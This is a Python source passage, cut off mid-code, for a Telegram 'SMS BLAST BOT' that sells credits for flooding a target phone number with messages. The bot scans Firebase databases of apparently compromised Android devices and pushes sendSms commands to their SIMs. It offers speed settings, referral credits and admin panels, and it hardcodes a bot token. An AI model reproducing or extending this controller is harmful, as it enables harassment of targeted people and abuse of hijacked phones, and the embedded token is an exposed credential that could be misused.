import asyncio, json, os, time, logging, random, string, threading
from datetime import datetime
from copy import deepcopy
from collections import defaultdict

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlasftBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"
EMOJI_STAR = "5372849966689566579"
EMOJI_ROCKET = "5359664288241829619"
EMOJI_CROWN = "6237927637906364256"
EMOJI_SHIELD = "6235476345451716705"
EMOJI_MONEY = "6244678063775289843"
EMOJI_PHONE = "6239930832128056797"
EMOJI_CHECK = "4958689671950369798"
EMOJI_CROSS = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK = "4956719506027185156"
EMOJI_GIFT = "5084613633418199991"
EMOJI_BELL = "5098265504796115765"
EMOJI_GEAR = "5116414868357907335"
EMOJI_VIDEO = "5372849966689566579"

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def _apply_btn_style(button, style: str = "primary"):
    if style in ("primary", "success", "danger"):
        try:
            object.__setattr__(button, "style", style)
        except Exception:
            setattr(button, "style", style)
        try:
            extra = getattr(button, "__pydantic_extra__", None)
            if extra is None:
                object.__setattr__(button, "__pydantic_extra__", {"style": style})
            else:
                extra["style"] = style
        except Exception:
            pass
    return button

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "", style: str = "primary") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    if emoji_id:
        b = InlineKeyboardButton(text=label, callback_data=callback_data, icon_custom_emoji_id=emoji_id)
    else:
        b = InlineKeyboardButton(text=label, callback_data=callback_data)
    return _apply_btn_style(b, style)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "", style: str = "primary") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    if emoji_id:
        b = InlineKeyboardButton(text=label, url=url, icon_custom_emoji_id=emoji_id)
    else:
        b = InlineKeyboardButton(text=label, url=url)
    return _apply_btn_style(b, style)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    kb_btn = KeyboardButton(text=sc(text), request_contact=request_contact, request_location=request_location)
    if style in ["primary", "success", "danger"]:
        setattr(kb_btn, "style", style)
    return kb_btn

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Start Blast", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")]
        ],
        resize_keyboard=True
    )

# ========== UPDATED: NEW ADMIN & CHANNEL ==========
MAIN_OWNER = 1029883095
SUPER_ADMIN_NAME = "@Blackdeviltoolowner_bot"
SUPER_ADMIN_LINK = "https://t.me/Blackdeviltoolowner_bot"
SUPER_ADMINS = [1029883095]

BOT_TOKEN = "8953936630:AAGJ3qr1I6AnCvkM42IOwPwoAN5kBq_JgzI"
LOG_CHANNEL_ID = -1004469810207

_DATA_FILE = "blast_data.json"
_VERSION = "v2-PREMIUM"
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 60.0

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": []
    }

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            default = _default_data()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            for uid_str, u in data.get("users", {}).items():
                if "credits" not in u:
                    u["credits"] = 0
                if "sms_history" not in u:
                    u["sms_history"] = []
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)
    return d

def save(d: dict):
    with open(_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2, ensure_ascii=False)

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍE! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        video_item = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=video_item, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Failed to send random video: {e}")

def kb(*rows) -> InlineKeyboardMarkup:
    def _auto_style(text: str, explicit=None) -> str:
        if explicit in ("primary", "success", "danger"):
            return explicit
        tl = (text or "").lower()
        if any(k in tl for k in ("cancel", "stop", "remove", "delete", "ban", "deduct", "bulk", "disable")):
            return "danger"
        if any(k in tl for k in ("add", "send", "start", "confirm", "check", "unban", "enable", "join", "refresh", "generate")):
            return "success"
        return "primary"

    built = []
    for row in rows:
        r = []
        for item in row:
            if len(item) >= 3:
                t, c, st = item[0], item[1], item[2]
            else:
                t, c, st = item[0], item[1], None
            b = InlineKeyboardButton(text=t, callback_data=c)
            r.append(_apply_btn_style(b, _auto_style(t, st)))
        built.append(r)
    return InlineKeyboardMarkup(inline_keyboard=built)

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="success"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="primary")
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")]
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS

    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."

    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"

    device_count = len(CACHED_DEVICES)
    time_diff = time.time() - LAST_SCAN_TIME

    if time_diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {device_count} ᴅᴇᴠɪᴄᴇs"
    elif time_diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"
    else:
        return f"{em(EMOJI_CROSS, '🔴')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG

    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
        start_scan = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])

            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan

            CACHED_DEVICES = devices

            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time())
                }
            LAST_SCAN_TIME = time.time()

            health_entry = {
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices"
            }
            DEVICE_HEALTH_LOG.append(health_entry)
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
                log.info(f"[BG-SCAN] {len(devices)} devices online | {len(fbs)} DBs | {scan_duration:.1f}s")

                current_fb_ids = {fb["id"] for fb in fbs}
                stale_fb_ids = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
                for stale in stale_fb_ids:
                    FB_DEVICE_COUNTS.pop(stale, None)

                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('background scanner active!')}</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs: <b>{len(fbs)}</b>\n"
                            f"{em(EMOJI_GEAR, '🔄')} ᴀᴜᴛᴏ-sᴄᴀɴ: ᴇᴠᴇʀʏ <b>1 ᴍɪɴᴜᴛᴇ</b>\n"
                            f"{em(EMOJI_WARNING, '⏱')} sᴄᴀɴ ᴛɪᴍᴇ: <b>{scan_duration:.1f}s</b>\n\n"
                            f"<i>{sc('bot is now running in ultra mode with per-user sessions.')}</i>",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        log.warning(f"Owner notify failed: {e}")
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"

        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return {}
                    return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]

    _dev_sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200:
                        return
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return
                    device_ids = json.loads(txt)
                    if not isinstance(device_ids, dict):
                        return

                    async def fetch_dev(dev_id: str):
                        try:
                            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                            async with _dev_sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status == 200:
                                        txt2 = (await r2.text()).strip()
                                        if txt2 == "null" or not txt2:
                                            return None
                                        dev_data = json.loads(txt2)
                                        if isinstance(dev_data, dict) and device_is_online(dev_data):
                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                            sims = dev_data.get("sims", [])
                                            return {
                                                "fb_id": fb["id"],
                                                "fb_url": fb["url"],
                                                "fb_label": fb.get("label", fb["url"][:30]),
                                                "dev_id": dev_id,
                                                "dev_name": name,
                                                "sims": sims,
                                            }
                        except Exception as e:
                            log.warning(f"Device fetch {dev_id}: {e}")
                        return None

                    dev_ids = list(device_ids.keys())
                    for i in range(0, len(dev_ids), 20):
                        batch = dev_ids[i:i+20]
                        dev_tasks = [fetch_dev(dev_id) for dev_id in batch]
                        dev_results = await asyncio.gather(*dev_tasks)
                        for res in dev_results:
                            if res:
                                results.append(res)
        except Exception as e:
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time())
        }
    )

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d):
        return True, []

    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []

    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔", style="danger")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄", style="success")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

# ========== TRIMMED PANEL TEXTS - FIXED MESSAGE TOO LONG ==========
def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = "🟢 FREE" if d.get("free_mode") else "🔴 APPROVAL"
    fj = d.get("force_join", {})
    fj_status = "🟢 ON" if fj.get("enabled") else "🔴 OFF"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    total_online = len(CACHED_DEVICES) if CACHED_DEVICES else 0
    protected_count = len(PROTECTED_NUMBERS)

    return (
        f"👑 OWNER PANEL\n"
        f"Owner: {SUPER_ADMIN_NAME}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔥 Firebase: {len(fbs)}\n"
        f"👑 Super Admins: {len(owners)}/6\n"
        f"🛡 Admins: {len(admins)}\n"
        f"👥 Users: {len(users)}\n"
        f"📹 Videos: {len(videos)}\n"
        f"📤 Sent: {stats.get('total_sent', 0)}\n"
        f"❌ Failed: {stats.get('total_failed', 0)}\n"
        f"🚀 Active: {active_sessions}\n"
        f"🔓 Mode: {mode}\n"
        f"📢 Force Join: {fj_status}\n"
        f"💳 Plans: {len(d.get('pricing', {}).get('plans', []))}\n"
        f"🔒 Protected: {protected_count}\n"
        f"📱 Online Devices: {total_online}\n"
        f"🔄 Scanner: {scan_info}"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    mode = "🟢 FREE" if d.get("free_mode") else "🔴 APPROVAL"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    total_online = len(CACHED_DEVICES) if CACHED_DEVICES else 0
    protected_count = len(PROTECTED_NUMBERS)

    return (
        f"🛡 ADMIN PANEL\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 Users: {len(users)}\n"
        f"📹 Videos: {len(videos)}\n"
        f"🚫 Banned: {len(banned)}\n"
        f"📤 Sent: {stats.get('total_sent', 0)}\n"
        f"❌ Failed: {stats.get('total_failed', 0)}\n"
        f"🚀 Active: {active_sessions}\n"
        f"🔥 Firebase: {len(d.get('firebases', []))}\n"
        f"🔒 Protected: {protected_count}\n"
        f"📱 Online: {total_online}\n"
        f"🔓 Mode: {mode}\n"
        f"🔄 {scan_info}"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    return (
        f"📱 SMS BLAST BOT\n"
        f"Owner: {SUPER_ADMIN_NAME}\n\n"
        f"👤 Role: {role_tag(uid, d)}\n"
        f"💰 Credits: {credits}\n"
        f"🔢 Uses: {udata.get('uses', 0)}\n"
        f"🔄 {scan_info}\n\n"
        f"Tap SEND SMS to start 🚀"
    )

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = ("🔴 DISABLE FREE", "owner:free:off") if d.get("free_mode") else ("🟢 ENABLE FREE", "owner:free:on")
    mode_style = "danger" if d.get("free_mode") else "success"
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("SEND SMS", "owner:send", EMOJI_ROCKET, "📤", style="success"), btn("FIREBASE", "owner:fb:menu:0", EMOJI_FIRE, "🔥", style="primary")],
        [btn("VIDEOS", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"), btn("SUPER ADMINS", "owner:owners:menu", EMOJI_CROWN, "👑", style="primary")],
        [btn("ADMINS", "owner:admins:menu", EMOJI_SHIELD, "🛡", style="primary"), btn("USERS", "owner:users:list", EMOJI_STAR, "👥", style="primary")],
        [btn("BAN", "owner:ban", EMOJI_CROSS, "🚫", style="danger"), btn("UNBAN", "owner:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("BROADCAST", "owner:broadcast", EMOJI_BELL, "📢", style="primary"), btn("API STATS", "owner:stats", EMOJI_STAR, "📊", style="primary")],
